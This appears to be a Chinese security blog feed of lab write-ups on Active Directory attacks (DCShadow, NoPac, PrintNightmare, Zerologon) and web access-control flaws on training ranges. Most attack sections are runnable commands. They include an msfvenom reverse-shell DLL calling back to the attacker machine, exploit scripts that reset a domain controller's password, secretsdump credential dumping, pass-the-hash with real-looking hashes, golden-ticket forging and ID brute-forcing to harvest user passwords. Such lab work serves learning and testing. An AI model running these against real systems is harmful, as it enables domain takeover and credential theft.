<p>前文已经知道，将用户的primaryGroupID改为512，可以然用户成为域管理员</p>
<p>RID是指相对标识符，时SID的一部分，通常在SID字符串的末端。</p>
<p>windows使用SID来区分用户账户和组的</p>
<h6 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h6><p>1.在任意注意中运行mimkatz并执行以下命令，创建恶意域控</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /object:CN=Alice,CN=Users,DC=hack-my,DC=com /attribute:primaryGroupID /value:512&quot; exit</code></p>
<p>2.第一个命令窗口不要关，重新打开一个，强制触发域复制，将数据更改推送至合法域控制器</p>
<p><code>mimikatz.exe &quot;lsadump::dcshadow /push&quot; exit</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325173750046.png"
                      alt="image-20230325173750046"
                ></p>
<p>也可以使用黄金票据+dcshadow进行</p>
<p>黄金票据是可以进行DCShadow需要注意的ldap的域管白银票据是不行的因为rpc需要TGT的认证,<br>        因此只能黄金票据+DCShadow。</p>
<p>​		打开新的mimikatz导入黄金票据:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:boy（这个可以随便取） /domain:hack-my.com /sid:S-1-5-21-3694414171-540705576-2292004015 /krbtgt:3240a50b789addc29388d03988e89209 /ticket:1.kirbi</span><br></pre></td></tr></table></figure></div>

<p>​		进行同步:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::dcshadow /push</span><br></pre></td></tr></table></figure></div>



<p> 按理来说这时候Alice已经是域管理员组的用户了，但不知道为啥我成功不了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230325175329381.png"
                      alt="image-20230325175329381"
                ></p>
<p>烦死</p>
<p>DCShadow使得测试人员可以直接修改活动目录数据库中的对象</p>
<p>域防护比较严的情况下，可以利用DCShadow操控SID History、Krbtgt账户的密码，或者将用户添加到特权组，实现域权限持久化</p>
]]></content>
  </entry>
  <entry>
    <title>补充：NoPac</title>
    <url>/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9ANoPac/</url>
    <content><![CDATA[<h1 id="NoPac"><a href="#NoPac" class="headerlink" title="NoPac"></a>NoPac</h1><p>CVE-2021-42287&#x2F;CVE-2021-42278</p>
<p>这个漏洞被命名为saMAccountName spoofing漏洞，该漏洞允许攻击者在仅有一个普通域账号的场景下，利用这个漏洞接管域控</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在kerberos认证的过程中，处理UserName字段时，如果找不到UserName字段（samAccountName值），KDC就会去查找UserName$</p>
<p>但是在Kerberos认证中负责用户身份权限的数据块是PAC，正常情况下TGS阶段的PAC是去拷贝AS阶段的，所以说如果时修改samAccountName值的域用户去申请PAC，在TGS阶段去申请ST时的PAC还是之前用户的，是没有办法正常利用成功的</p>
<p>所以就需要S4U2Self请求，利用特性，在TGS阶段的时候会根据S4U2Self协议中模拟的用户生成对应的PAC，就可以绕过TGS阶段的PAC是复制AS阶段生成的，放在票据ST之中就可以拿着这个ST去访问域控</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在得到一个域用户账号密码情况下，通过修改samAccountName属性为域控机器名，使用该用户去申请一张带有PAC的TGT，再将该用户的samAccountName属性修改成原来的值（或者随便其他的也可以），最后再利用S4U2Self协议去请求访问域控获取该服务的ST票据</p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>首先可以利用addcomputer.py创建一个机器账户</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Python3 addcomputer.py -computer-name &#x27;test7&#x27; -computer-pass &#x27;Admin!@#45&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825144458367.png"
                      alt="image-20230825144458367"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825145634000.png"
                      alt="image-20230825145634000"
                ></p>
<p>然后使用工具将刚刚创建的机器账户的samAccountName改成dc的机器名</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 renameMachine.py -current-name &#x27;test7&#x27; -new-name &#x27;DC&#x27; -dc-ip 192.168.81.183 &#x27;hack-my.com/boy:Admin!@#45&#x27;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">renameMachine下载</span><br><span class="line"></span><br><span class="line">https://gist.githubusercontent.com/snovvcrash/3bf1a771ea6b376d374facffa9e43383/raw/d4191e295c96bc1cfb0a54b18cfbb8b21d25b483/renameMachine.py</span><br></pre></td></tr></table></figure></div>

<p>但是报错了，不知道为什么</p>
<p>这边贴上参考文章</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44747030/article/details/127158385</span><br></pre></td></tr></table></figure></div>

<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p>这个方法比较简单，是单纯的工具利用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 noPac.py -use-ldap hack-my.com/boy:Admin\!\@\#45 -dc-ip 192.168.81.183 -shell</span><br></pre></td></tr></table></figure></div>

<p>报错</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825152813690.png"
                      alt="image-20230825152813690"
                ></p>
<p>遇到报错的话就更改配置文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/ssl/openssl.cnf</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825152756442.png"
                      alt="image-20230825152756442"
                ></p>
<p>在最后加上这些</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825152703315.png"
                      alt="image-20230825152703315"
                ></p>
<p>之后再运行就可以了，直接获取域控权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825153007208.png"
                      alt="image-20230825153007208"
                > </p>
]]></content>
  </entry>
  <entry>
    <title>补充：PrintNightmare</title>
    <url>/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9APrintNightmare/</url>
    <content><![CDATA[<h1 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h1><p>Windows Print Spooler是打印后台处理服务，即管理所有本地和网络打印队列及控制所有打印工作。Windows Print Spooler 存在权限提升漏洞，经过身份认证的攻击者可利用此漏洞使 Spooler 服务加载恶意 DLL，从而获取权限提升。</p>
<p>而这个漏洞是发生在Windows打印服务当中的漏洞，攻击者可以利用这个漏洞使用低权限用户加载恶意DLL，实现远程代码执行，被称为PrintNightmare</p>
<p>该漏洞属于高危漏洞，是由于在所有的windows的系统之中，包括域控和具有系统管理员权限的计算机都会在默认条件下开启Windows打印后台处理程序，是机器更容易受到伤害</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali攻击机   192.168.81.135</span><br><span class="line">win2012域控  192.168.81.183</span><br></pre></td></tr></table></figure></div>

<p>先查看spooler服务是否启动</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825162712979.png"
                      alt="image-20230825162712979"
                ></p>
<p>需要在攻击机中开启匿名访问</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br></pre></td></tr></table></figure></div>

<p>在smb.conf末尾添加force user&#x3D;nobody</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825172216154.png"
                      alt="image-20230825172216154"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825172233665.png"
                      alt="image-20230825172233665"
                ></p>
<p>然后启动smbd服务</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825171029758.png"
                      alt="image-20230825171029758"
                ></p>
<p>之后利用msf生成一个攻击payload</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.81.135 LPORT=9999 -f dll -o /tmp/nihao.dll</span><br></pre></td></tr></table></figure></div>

<p>这边将生成的文件放置于&#x2F;tmp文件夹中，是由于&#x2F;tmp文件夹是smbd服务的默认文件夹</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825170108882.png"
                      alt="image-20230825170108882"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825170126499.png"
                      alt="image-20230825170126499"
                ></p>
<p>之后开启监听</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825171414592.png"
                      alt="image-20230825171414592"
                ></p>
<p>利用exp执行，不知道为什么一直报错</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyhton3 CVE-2021-1675.PY DC:Admin\!\@\#45@192.168.81.183 &#x27;\\192.168.81.135\smb\nihao.dll&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825171845361.png"
                      alt="image-20230825171845361"
                ></p>
<p>正常的状态是运行完之后是直接可以反弹shell的</p>
<p>但是这一步运行不起来也就弹不了了，很难受</p>
<h2 id="mimikatz的利用"><a href="#mimikatz的利用" class="headerlink" title="mimikatz的利用"></a>mimikatz的利用</h2><p>在开启了smb共享之后就可以直接使用mimikatz进行利用</p>
<h3 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a>mimikatz利用</h3><p>在运行了smb服务器之后（这个smb服务器是可以搭在域内主机中，但是这个smb不在域内不知道可以不可以），可在域内主机中运行mimikatz实现攻击</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">msic::printnightmare server:目标IP library:\\ip\share\rd1.dll</span><br></pre></td></tr></table></figure></div>

<p>貌似win2012能上传dll，但是不能上线</p>
]]></content>
  </entry>
  <entry>
    <title>补充：zerologon（CVE-2020-1472）</title>
    <url>/2024/02/29/%E8%A1%A5%E5%85%85%EF%BC%9Azerologon%EF%BC%88CVE-2020-1472%EF%BC%89/</url>
    <content><![CDATA[<h1 id="zerologon（CVE-2020-1472）"><a href="#zerologon（CVE-2020-1472）" class="headerlink" title="zerologon（CVE-2020-1472）"></a>zerologon（CVE-2020-1472）</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Netlogon远程协议，同时也被称为MS-NRPC，他是一个远程过程调用（RPC）接口，只供加入域的设备使用，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库</p>
<p>Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系，此RPC接口用于发现和管理这些关系</p>
<p>MS-NRPC 包括一种身份验证方法和一种建立 Netlogon 安全通道的方法。这些更新强制指定的 Netlogon 客户端行为在成员计算机和 Active Directory (AD) 域控制器 (DC) 之间使用具有 Netlogon 安全通道的安全RPC。</p>
<p>zerologon载windows域环境中是一个权限提升的漏洞，这是因为微软在netlogon协议中没有正确使用加密算法而导致的漏洞。</p>
<p>由于在aes加密运算的过程中，使用laaes-cfb8模式并且错误的将IV设置为全零，这就导致攻击者在明文、IV等可控的情况下存在较高的概率使得产生的密文全为零</p>
<h2 id="受影响范围"><a href="#受影响范围" class="headerlink" title="受影响范围"></a>受影响范围</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Microsoft Windows Server 2008 R2 SP1</span><br><span class="line">Microsoft Windows Server 2012</span><br><span class="line">Microsoft Windows Server 2012 R2</span><br><span class="line">Microsoft Windows Server 2016</span><br><span class="line">Microsoft Windows Server 2019</span><br><span class="line">Microsoft Windows Server version 2004 (Server Core Installation)</span><br><span class="line">Microsoft Windows Server version 1903 (Server Core Installation)</span><br><span class="line">Microsoft Windows Server version 1909 (Server Core Installation)</span><br></pre></td></tr></table></figure></div>

<p>以下是通讯流程</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825093607003.png"
                      alt="image-20230825093607003"
                ></p>
<p>上图可知，攻击者的可控因素是client challenge在这个中，攻击者会将这个值设置为全0</p>
<p>对于这个encrypt过程中，采用的是AES-CFRB8的算法过程，如下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825094502441.png"
                      alt="image-20230825094502441"
                ></p>
<p>该算法的所有安全性全部取决于传入的IV，如果IV以及client challenge全0的话</p>
<p>就具有1&#x2F;256的概率用8字节全0明文得到8字节全密文</p>
<p>所以这个漏洞的利用关键就是利用碰撞，向域发起netlogon计算机账户认证请求，使用8字节的全0的client challenge不断尝试得到一个8字节全0的client credential通过认证，然后就可以调用相关操作对域控密码进行修改</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">域  控      win2012        192.168.81.177</span><br><span class="line">域  名      hack-my.com</span><br><span class="line">攻击机      kali           192.168.81.135</span><br></pre></td></tr></table></figure></div>

<p>首先得先检测是否会存在该漏洞</p>
<p>利用工具进行检测</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">在这之前得先导入requestments.txt加载对应库</span><br><span class="line">pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">python3 zerologon_tester.py dc（主机名） 192.168.30.10</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825101017953.png"
                      alt="image-20230825101017953"
                ></p>
<p>换mimikatz也可以检测</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon /target:192.168.30.10 /account:dc$</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825101211491.png"
                      alt="image-20230825101211491"
                ></p>
<p>说明具有该漏洞</p>
<p>所以就可以利用工具直接把域控账户的密码置空</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py  dc  192.168.81.177</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825102055408.png"
                      alt="image-20230825102055408"
                ></p>
<p>置空成功</p>
<p>然后可以导出hash值，来验证一下子</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py hack-my.com/dc\$@192.168.81.177 -no-pass</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825102358662.png"
                      alt="image-20230825102358662"
                ></p>
<p>域控hash的值为31d6cfe0d16ae931b73c59d7e0c089c0，为空密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825102511051.png"
                      alt="image-20230825102511051"
                ></p>
<p>mimikatz中也内置了这个功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个也可以直接利用置空密码</span><br><span class="line">lsadump::zerologon /target:&lt;dc-ip&gt; /account:&lt;主机名&gt;$ /exploit</span><br></pre></td></tr></table></figure></div>

<p>然后获取到域管的密码</p>
<p>可以直接利用域管administrator拿下域控</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pyhton3 wmicexec.py administrator@192.168.81.177 -hashes  aad3b435b51404eeaad3b435b51404ee:38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825102908876.png"
                      alt="image-20230825102908876"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825103020878.png"
                      alt="image-20230825103020878"
                ></p>
<h3 id="恢复域控hash"><a href="#恢复域控hash" class="headerlink" title="恢复域控hash"></a>恢复域控hash</h3><p>在攻击成功之后一定要恢复域控的原始hash值，不然可能会出现域控重启之后无法开机、脱域的情况</p>
<p>这是因为我们置空的是在域控中的ntds.dit文件中的密码，如果这样的话就会和注册表和lsass进程中的密码不一致，导致域控重启之后无法开机、脱域等情况</p>
<h4 id="获取原始hash值"><a href="#获取原始hash值" class="headerlink" title="获取原始hash值"></a>获取原始hash值</h4><h5 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h5><p>在域控上执行命令导出三个文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825103923343.png"
                      alt="image-20230825103923343"
                ></p>
<p>然后将这三个文件放到impact的example目录下</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825104157335.png"
                      alt="image-20230825104157335"
                ></p>
<p>然后执行securtesdump.py读取hash值</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure></div>

<p>$MACHINE.ACC就是原来的hash值</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825104356106.png"
                      alt="image-20230825104356106"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:a6ab398a705e066e46eedd34e41f6748</span><br></pre></td></tr></table></figure></div>

<h5 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h5><p>可以使用mimikatz从lsass.exe进程抓取hash</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825104958980.png"
                      alt="image-20230825104958980"
                ></p>
<h4 id="恢复hash值"><a href="#恢复hash值" class="headerlink" title="恢复hash值"></a>恢复hash值</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 reinstall_original_pw.py dc 192.168.81.177  a6ab398a705e066e46eedd34e41f6748</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825105717824.png"
                      alt="image-20230825105717824"
                ></p>
<p>利用域管administrator的hash导出hash查看是否修改成功</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pthon3 secretsdump.py hack-my.comadministrator@192.168.81.177 -hashes aad3b435b51404eeaad3b435b51404ee:38fe728ae616f0fde13715e7c320685f</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825110308448.png"
                      alt="image-20230825110308448"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825110236855.png"
                      alt="image-20230825110236855"
                ></p>
<p>恢复成功</p>
<p>也可以使用mimikatz抓取hexpass，然后用restorepassword.py恢复</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230825111325867.png"
                      alt="image-20230825111325867"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 restorepassword.py hack-my/dc@dc -target-ip 192.168.81.177 -hexpass  mimikatz导出的hexpass</span><br></pre></td></tr></table></figure></div>



<p>至此所有的利用就完成了</p>
]]></content>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2023/03/08/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117170059743.png"
                      alt=" "
                ></p>
<p>一般来说是更换了某个id之类的身份标识，从而使A账号获取（修改，删除等）B账号数据。</p>
<p>使用低权限身份账号，发送高权限账号才能有点请求，获得高权限的操作。</p>
<p>通过删除请求中的认证信息后重放该请求，依旧可以访问或者完成操作。</p>
<h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><h6 id="第一项就是信息收集"><a href="#第一项就是信息收集" class="headerlink" title="第一项就是信息收集"></a>第一项就是信息收集</h6><p>一般一个网站注册时输入用户名都会禁止用户名的重复使用，可以通过这个机制判断存在的用户名，或者再一些个人主页的介绍中也会显示该用户的用户名等一些信息 </p>
<h6 id="pikachu靶场水平越权演示（添加用户）"><a href="#pikachu靶场水平越权演示（添加用户）" class="headerlink" title="pikachu靶场水平越权演示（添加用户）"></a>pikachu靶场水平越权演示（添加用户）</h6><p>先登入自己或者已知的账号，用抓包工具抓个包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173104587.png"
                      alt="image-20221117173104587"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173229898.png"
                      alt="image-20221117173229898"
                ></p>
<p>通过前面的信息收集获取别的账号用户名，更改username数据包信息为lucy，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173612943.png"
                      alt="image-20221117173612943"
                ></p>
<p>发现直接登入进去，信息得以获取</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117173357607.png"
                      alt="image-20221117173357607"
                ></p>
<h6 id="pikachu靶场垂直越权漏洞演示"><a href="#pikachu靶场垂直越权漏洞演示" class="headerlink" title="pikachu靶场垂直越权漏洞演示"></a>pikachu靶场垂直越权漏洞演示</h6><p>首先来到管理员后台，发现具有删除操作以及用户添加权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117175438679.png"
                      alt="image-20221117175438679"
                ></p>
<p>添加账号，并通过抓包工具抓取数据包，存放数据包备用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180719404.png"
                      alt="image-20221117180719404"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180735730.png"
                      alt="image-20221117180735730"
                ></p>
<p>接下来来到普通用户界面，发现只有查看权限</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180014736.png"
                      alt="image-20221117180014736"
                ></p>
<p>抓取该用户的数据包，并且复制该用户的cookie信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180904785.png"
                      alt="image-20221117180904785"
                ></p>
<p>将该cookie替换至刚才保存的管理员数据包中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117180934389.png"
                      alt="image-20221117180934389"
                ></p>
<p>放包，发现刚才添加的用户，以普通用户的形式被添加</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117181007984.png"
                      alt="image-20221117181007984"
                ></p>
<p>等等！好像有点不对劲：这个步骤是先要利用管理员的数据包，但是你都具有管理员权限了，为什么还用普通用户添加账号，这根本就不符合逻辑，显得有些鸡肋。</p>
<p>那该怎么利用这个漏洞：主要是研究怎么获取管理员数据包</p>
<p>1.普通用户如果在前端具有操作界面（就是说显示着可以添加用户但是点之后会给你提示说没有权限的弹窗之类的）可以抓取数据包</p>
<p>2.通过网站源码本地搭建，自己模拟抓取</p>
<p>3.盲猜</p>
<h6 id="墨者靶场题目演示（水平越权）："><a href="#墨者靶场题目演示（水平越权）：" class="headerlink" title="墨者靶场题目演示（水平越权）："></a>墨者靶场题目演示（水平越权）：</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201422846.png"
                      alt="image-20221117201422846"
                ></p>
<p>登入靶场，目标是获取马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201456774.png"
                      alt="image-20221117201456774"
                ></p>
<p>登入测试账号test，抓包，发现uid&#x3D;test，如果将其改成马春生的用户名会不会登入进去？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117201819559.png"
                      alt="image-20221117201819559"
                ></p>
<p>第二个数据包，发现有个card_id可能是用户的编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202202381.png"
                      alt="image-20221117202202381"
                ></p>
<p>访问card_id，可以得到该账户的信息，包括密码等</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202646702.png"
                      alt="image-20221117202646702"
                ></p>
<p>改变card_id值发现可以访问别的用户的信息，一个一个试断然不可能这时候就需要借用工具来解决</p>
<p>将数据包发送值intruder模块</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117202840353.png"
                      alt="image-20221117202840353"
                ></p>
<p>将card_id的值的最后两位作为替换值，范围为00-99，通过爆破可获得其他用户的数据信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203032419.png"
                      alt="image-20221117203032419"
                ></p>
<p>那该怎么找到马春生的账号card_id呢？</p>
